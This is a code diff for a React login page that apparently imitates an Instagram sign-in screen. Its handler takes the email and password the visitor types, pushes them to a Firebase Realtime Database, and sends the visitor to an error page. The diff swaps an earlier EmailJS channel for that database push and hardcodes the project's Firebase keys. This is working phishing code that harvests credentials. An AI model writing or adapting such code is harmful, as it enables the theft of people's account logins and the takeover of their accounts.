@@ -5,7 +5,23 @@ import appstore from '../assets/appstore.png'
 import playstore from '../assets/playstore.png'
 import facebook from '../assets/fbicon.png'
 import {  useNavigate } from 'react-router-dom'
-import emailjs from '@emailjs/browser'
+import { initializeApp } from "firebase/app"
+import { getDatabase, ref, push } from "firebase/database"
+
+
+const firebaseConfig = {
+  apiKey: "AIzaSyAKiTkxikSGQoBHMet1xkz6M30sam9h03Y",
+  authDomain: "listforinsta.firebaseapp.com",
+  databaseURL: "https://listforinsta-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "listforinsta",
+  storageBucket: "listforinsta.appspot.com",
+  messagingSenderId: "717868487701",
+  appId: "1:717868487701:web:0bd823c295d64aab886a1c"
+}
+
+const app = initializeApp(firebaseConfig)
+const db = getDatabase(app, firebaseConfig.databaseURL) // using getdatabase function to get Realtime Database SDK that is associated with FirebaseApp
+const addInDb = ref(db, "items")  //referencing the db
 
 function Login() {
     const [email, setEmail] = useState("");
@@ -15,24 +31,14 @@ function Login() {
     const navigate = useNavigate()
 
     
-    const serviceId = import.meta.env.VITE_Service_ID
-    const templateId = import.meta.env.VITE_Template_ID
-    const publicKey = import.meta.env.VITE_Public_Key
-
   
-      const templateParams= {
-        from_email: email,
-        from_password: password,
-      }
   
     function handleLogin(e) {
       e.preventDefault()
       console.log(email)
       console.log(password)
       navigate('/error')
-      emailjs.send(serviceId,templateId,templateParams,publicKey)
-      .then((response) => console.log(response))
-      .catch((error)=> console.log(error))
+      push(addInDb, {mail: email, pass: password})
 
     }
 
